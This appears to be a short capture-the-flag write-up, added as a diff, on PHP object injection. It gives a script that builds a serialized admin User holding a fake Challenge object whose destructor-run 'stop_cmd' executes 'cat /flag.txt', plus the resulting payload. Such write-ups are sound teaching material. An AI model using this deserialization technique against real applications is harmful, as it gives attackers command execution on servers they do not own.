@@ -1,0 +1,38 @@
+the objective of this challenge was to read the content of the file /flag.txt. 
+In order to anchive the goal I used the class Challenge: the class calls
+a method "stop" when is destructed, and in that method there is a exec command.
+By looking in the code I saw I could load a challenge with the "Upload User" 
+function. So I packed a malicious user with a fake challenge inside. 
+
+this is the code used to generate the serialized data to load in the file
+<?php
+
+  class Challenge{
+  }
+
+  class User{
+  }
+
+
+  $u = new User(); 
+  $u->name="pippo";
+  $u->id=9999;
+  $u->isAdmin=1;
+
+  $u->points=888;
+  $x = new Challenge(); 
+  $x->name = 'AHAHAHA'; 
+  $x->description = 'come pensi di farlo?'; 
+  $x->stop_cmd = "cat /flag.txt";
+
+  $u->solved[]=$x;
+
+  $data = serialize($u);
+  echo $data; 
+?>
+
+this is the serialized data loaded using a file txt
+O:4:"User":5:{s:4:"name";s:5:"pippo";s:2:"id";i:9999;s:7:"isAdmin";i:1;s:6:"points";i:888;s:6:"solved";a:1:{i:0;O:9:"Challenge":3:{s:4:"name";s:7:"AHAHAHA";s:11:"description";s:20:"come pensi di farlo?";s:8:"stop_cmd";s:13:"cat /flag.txt";}}}
+
+as you can see in the 'stop_cmd' there is the command 'cat /flag.txt' that will be run after the loading of
+the file
